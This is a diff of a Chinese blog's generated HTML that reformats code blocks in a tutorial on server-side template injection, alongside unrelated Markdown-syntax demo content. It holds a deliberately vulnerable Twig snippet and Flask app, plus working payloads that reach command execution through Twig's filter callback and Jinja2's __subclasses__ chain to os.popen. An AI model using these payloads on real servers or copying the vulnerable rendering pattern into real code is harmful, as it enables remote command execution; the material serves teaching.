@@ -7,26 +7,20 @@
 <span id="more"></span>
 <hr>
 <p>下面将引用一个简单的例子来说明，假设有一个包含以下代码的Twig模板文件 <code>template.twig</code>：</p>
-<pre><code>Hello, &#123;&#123; name &#125;&#125;!
-</code></pre>
-<p>在后端PHP代码中，可能会这样使用Twig引擎来渲染模板：</p>
-<pre><code>$loader = new \Twig\Loader\FilesystemLoader(&#39;/path/to/templates&#39;);
-$twig = new \Twig\Environment($loader);
+<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">Hello, </span><span class="template-variable">&#123;&#123; <span class="name">name</span> &#125;&#125;</span><span class="language-xml">!</span></span><br></pre></td></tr></table></figure>
 
-$name = $_GET[&#39;name&#39;]; // 从用户输入获取name参数
-echo $twig-&gt;render(&#39;template.twig&#39;, [&#39;name&#39; =&gt; $name]);
-//正确的代码应该在后面两段加上过滤和验证
-</code></pre>
+<p>在后端PHP代码中，可能会这样使用Twig引擎来渲染模板：</p>
+<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="type"></span>\Twig\Loader\FilesystemLoader(<span class="string">&#x27;/path/to/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="type"></span>\Twig\Environment(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// 从用户输入获取name参数</span></span><br><span class="line">echo <span class="variable">$twig</span>-&gt;render(<span class="string">&#x27;template.twig&#x27;</span>, [<span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$name</span>]);</span><br><span class="line"><span class="comment">//正确的代码应该在后面两段加上过滤和验证</span></span><br></pre></td></tr></table></figure>
+
 <p>如果攻击者将name参数设置为恶意Twig模板代码，比如：</p>
-<pre><code>&#123;&#123; 7 * 7 &#125;&#125;
-</code></pre>
+<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">7</span> * <span class="number">7</span> &#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>那么最终生成的模板内容将是：</p>
-<pre><code>Hello, 49!
-</code></pre>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Hello</span>, <span class="number">49</span>!</span><br></pre></td></tr></table></figure>
+
 <p>但是，如果攻击者将name参数设置为更危险的代码，比如：</p>
-<pre><code>&#123;&#123; _self.env.registerUndefinedFilterCallback('exec') &#125;&#125;
-&#123;&#123; filter('ls -la') &#125;&#125;
-</code></pre>
+<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">_self.env.registerUndefinedFilterCallback</span>(<span class="name">&#x27;exec&#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; <span class="name">filter</span>(<span class="name">&#x27;ls -la&#x27;</span>) &#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>这将导致Twig引擎执行系统命令 ls -la，可能导致服务器远程命令执行漏洞，造成严重安全问题。</p>
 <br>
 
@@ -37,37 +31,12 @@ echo $twig-&gt;render(&#39;template.twig&#39;, [&#39;name&#39; =&gt; $name]);
 <p><img src="/posts/3320036978/0.png"></p>
 <br>
 
-<h2 id="python案例说明"><a href="#python案例说明" class="headerlink" title="python案例说明"></a>python案例说明</h2><pre><code>from flask import Flask    # Jinja2是Flask框架的一部分，Jinja2会把模板参数提供的相应的值替换成 &#123;&#123;…&#125;&#125; 块
-from flask import request
-from flask import config
-from flask import render_template_string
-app = Flask(__name__)
+<h2 id="python案例说明"><a href="#python案例说明" class="headerlink" title="python案例说明"></a>python案例说明</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask    <span class="comment"># Jinja2是Flask框架的一部分，Jinja2会把模板参数提供的相应的值替换成 &#123;&#123;…&#125;&#125; 块</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;    # 这里是报错页面所显示的内容</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;    # %s接收404_url下的参数，返回到报错页面中</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
 
-app.config[&#39;SECRET_KEY&#39;] = &quot;flag&#123;SSTI_123456&#125;&quot;
-@app.route(&#39;/&#39;)
-def hello_world():
-    return &#39;Hello World!&#39;
-
-@app.errorhandler(404)
-def page_not_found(e):
-    template = &#39;&#39;&#39;
-&#123;%% block body %%&#125;
-    &lt;div class=&quot;center-content error&quot;&gt;    # 这里是报错页面所显示的内容
-        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;/h1&gt;
-        &lt;h3&gt;%s&lt;/h3&gt;    # %s接收404_url下的参数，返回到报错页面中
-    &lt;/div&gt; 
-&#123;%% endblock %%&#125;
-&#39;&#39;&#39; % (request.args.get(&#39;404_url&#39;))
-    return render_template_string(template), 404
-
-if __name__ == &#39;__main__&#39;:
-    app.run(host=&#39;0.0.0.0&#39;,debug=True)
-</code></pre>
 <p>随便输入字符使得页面报错，并利用404_url来接收参数，发现存在注入<br><img src="/posts/3320036978/1.png"></p>
 <p>使用<strong>payload</strong>进行注入</p>
-<pre><code>使用__import__的os。
-&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()
-</code></pre>
+<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">使用<span class="variable">__import__</span>的os。</span><br><span class="line"><span class="string">&quot;&quot;</span>.<span class="variable">__class__</span>.<span class="variable">__bases__</span>[<span class="number">0</span>].<span class="variable">__subclasses__</span>()[<span class="number">75</span>].<span class="variable">__init__</span>.<span class="variable">__globals__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
 <p><img src="/posts/3320036978/2.png"></p>
 <br>
 
@@ -175,7 +144,7 @@ $headband-bg                    = $black-deep;
 <p>插入图片Markdown语法代码：<code>![图片alt](图片链接 &quot;图片title&quot;)</code> 的格式。<br>例如：<img src="https://pic2.zhimg.com/v2-5fb13110e1de13d4c11e6e7f5b8026da_r.jpg" alt="这是一张图片" title="just a example"></p>
 <h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>行内代码使用单个反引号 <code> 包围。例如：</code>代码&#96;。</p>
 <p>代码块使用三个反引号`&#96;&#96;或四个空格缩进。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是一个代码块</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">这是一个代码块</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>你可以使用三个以上的星号 ***、减号 — 或下划线 ___ 来创建一个水平分割线。</p>
